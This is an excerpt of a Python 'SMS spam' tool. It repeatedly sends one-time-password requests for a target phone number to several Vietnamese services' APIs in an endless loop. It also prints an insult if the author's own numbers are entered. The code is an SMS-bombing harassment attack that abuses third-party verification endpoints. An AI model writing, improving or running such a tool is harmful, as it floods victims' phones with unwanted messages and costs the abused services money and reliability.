...
def Banner():
    ...
    title = "\n\n\nhttps://www.youtube.com/lequanggminhhofficial"
    banner = """\n\n\n.d8888. d8888b.  .d8b.  .88b  d88.   .d8888. .88b  d88. .d8888. \n88"  YP 88  `8D d8" `8b 88"YbdP`88   88"  YP 88"YbdP`88 88"  YP \n`8bo.   88oodD" 88ooo88 88  88  88   `8bo.   88  88  88 `8bo.   \n  `Y8b. 88~~~   88~~~88 88  88  88     `Y8b. 88  88  88   `Y8b. \ndb   8D 88      88   88 88  88  88   db   8D 88  88  88 db   8D \n`8888Y" 88      YP   YP YP  YP  YP   `8888Y" YP  YP  YP `8888Y" \n\n                           TOOL SPAM SMS \n\n                CODE BY: Kyle\n\n                         Github: github.com/kyletran191\n\n\n"""
...
def call2(phone):
  ...
  requests.post('https://api.dongplus.vn/api/user/send-one-time-password',
                ...
                json=json_data)
  if requests.status_codes == 200:
      print(format_print("*", "DONGPLUS: THÀNH CÔNG!"))
  else:
      print(format_print("x", "DONGPLUS: THẤT BẠI!"))
...
def call3(phone):
  ...
  requests.post('https://oncredit.vn/?ajax',
                ...
                data=data)
  if requests.status_codes == 200:
      print(format_print("*", "ONCREDIT: THÀNH CÔNG!"))
  else:
      print(format_print("x", "ONCREDIT: THẤT BẠI!"))
...
def Main():
    ...
    if phone in listsdt:
        print(format_print("!", "BỐ MÀY LÀ ADMIN, MÀY THÍCH SPAM KHÔNG CON CHÓ?"))
        exit()
    elif len(phone) != 10:
        print(format_print("!", "SỐ ĐIỆN THOẠI PHẢI CÓ 10 SỐ!"))
    while True:
        call1(phone)
        oldvayvnd(phone)
        oldpops(phone)
